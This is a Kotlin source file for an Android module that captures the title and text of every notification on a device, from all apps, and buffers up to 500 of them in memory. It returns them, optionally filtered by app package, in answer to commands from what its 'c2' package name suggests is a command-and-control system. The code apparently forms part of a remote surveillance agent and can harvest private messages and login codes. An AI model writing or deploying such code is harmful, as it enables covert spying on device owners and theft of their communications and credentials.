package org.synapse.core.modules

import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.synapse.core.c2.Command
import org.synapse.core.core.NotificationEntry
import org.synapse.core.core.SynapseResponse

/**
 * NotificationListenerService-based notification capture.
 * Requires the user to enable Synapse Notification Listener in Settings.
 * Notifications are buffered in-memory and returned on demand.
 */
object NotificationModule {

    // In-memory buffer of captured notifications
    private val capturedNotifications = mutableListOf<NotificationEntry>()
    private const val MAX_BUFFER = 500

    /**
     * NotificationListenerService companion — the actual service lives in the app.
     * This module just provides the query interface.
     * The service calls onNotificationPosted() which feeds into this buffer.
     */
    fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        val entry = NotificationEntry(
            package_name = sbn.packageName,
            app_name = "", // resolved by the caller
            title = title,
            text = text,
            timestamp = sbn.postTime
        )

        synchronized(capturedNotifications) {
            capturedNotifications.add(0, entry)
            if (capturedNotifications.size > MAX_BUFFER) {
                capturedNotifications.removeAt(capturedNotifications.size - 1)
            }
        }
    }

    suspend fun list(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(MAX_BUFFER)
        val packageFilter = cmd.params["package"]  // optional filter by package name

        return try {
            val results = synchronized(capturedNotifications) {
                val filtered = if (packageFilter != null) {
                    capturedNotifications.filter { it.package_name.contains(packageFilter) }
                } else {
                    capturedNotifications.toList()
                }
                filtered.take(count)
            }

            SynapseResponse.NotificationsResponse(
                notifications = results,
                count = results.size
            )
        } catch (e: Exception) {
            SynapseResponse.ErrorResponse("notifications:${e.message}", "notifications")
        }
    }
}
